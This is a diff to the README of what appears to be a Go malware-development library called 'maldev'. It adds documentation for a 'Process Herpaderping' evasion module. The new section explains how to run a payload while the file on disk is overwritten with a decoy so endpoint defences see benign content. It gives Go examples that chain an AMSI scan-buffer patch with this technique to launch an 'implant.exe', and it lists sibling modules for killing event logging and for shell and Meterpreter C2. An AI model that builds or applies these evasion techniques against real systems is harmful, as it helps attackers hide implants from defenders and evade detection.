@@ -144,6 +144,7 @@ func main() {
 | `evasion/acg` | Arbitrary Code Guard policy | T1562.001 -- Impair Defenses | Low | Windows 10+ |
 | `evasion/blockdlls` | Block non-Microsoft DLLs | T1562.001 -- Impair Defenses | Low | Windows 10+ |
 | `evasion/phant0m` | Event Log thread termination | T1562.002 -- Disable Event Logging | High | Windows |
+| `evasion/herpaderping` | Process image tampering via kernel section cache | T1055 -- Process Injection | Medium | Windows 10+ |
 | `evasion/antidebug` | Debugger detection | T1622 -- Debugger Evasion | Low | Cross-platform |
 | `evasion/antivm` | VM/hypervisor detection | T1497.001 -- System Checks | Low | Cross-platform |
 | `evasion/timing` | CPU-burning delays | T1497.003 -- Time Based Evasion | Low | Cross-platform |
@@ -225,6 +226,40 @@ err := phant0m.Kill()
 
 **Advantages:** Suppresses event log recording without stopping the service.
 **Limitations:** High detection risk -- killing Event Log threads triggers alerts in mature environments.
+
+</details>
+
+<details>
+<summary><strong>Process Herpaderping</strong> (<code>evasion/herpaderping</code>) — T1055</summary>
+
+Executes a PE while the file on disk shows different (benign) content. Exploits the timing gap between process creation and EDR security callbacks.
+
+**How it works:** The kernel caches the PE image in memory when NtCreateSection(SEC_IMAGE) is called. The file on disk can then be overwritten with a decoy before the initial thread is created — EDR sees the decoy, not the original payload.
+
+```go
+// Execute a payload with svchost.exe as decoy
+err := herpaderping.Run(herpaderping.Config{
+    PayloadPath: "implant.exe",
+    TargetPath:  `C:\Temp\legit.exe`,
+    DecoyPath:   `C:\Windows\System32\svchost.exe`,
+})
+
+// Via composable interface
+techniques := []evasion.Technique{
+    amsi.ScanBufferPatch(),
+    herpaderping.Technique(herpaderping.Config{
+        PayloadPath: "implant.exe",
+        TargetPath:  `C:\Temp\legit.exe`,
+    }),
+}
+evasion.ApplyAll(techniques, nil)
+```
+
+| Aspect | Value |
+|--------|-------|
+| Detection | Sysmon Event ID 25 (ProcessTampering) |
+| Advantage | File on disk always shows benign content |
+| Limitation | Requires write access to target path |
 
 </details>
 
@@ -615,7 +650,7 @@ All technique packages that accept a `*wsyscall.Caller` parameter treat `nil` as
 | Technique ID | Technique Name | Package(s) |
 |-------------|---------------|------------|
 | T1027.002 | Obfuscated Files: Software Packing | `pe/morph` |
-| T1055 | Process Injection | `inject` |
+| T1055 | Process Injection | `inject`, `evasion/herpaderping` |
 | T1055.001 | Process Injection: DLL Injection | `pe/srdi` |
 | T1057 | Process Discovery | `process/enum` |
 | T1059 | Command and Scripting Interpreter | `c2/shell`, `c2/meterpreter` |
@@ -677,6 +712,7 @@ maldev/
 |   +-- acg/               Arbitrary Code Guard policy
 |   +-- blockdlls/         Non-Microsoft DLL blocking
 |   +-- phant0m/           Event Log thread termination
+|   +-- herpaderping/      Process image tampering (kernel section cache)
 |   +-- antidebug/         Debugger detection
 |   +-- antivm/            VM/hypervisor detection
 |   +-- timing/            CPU-burning time delays
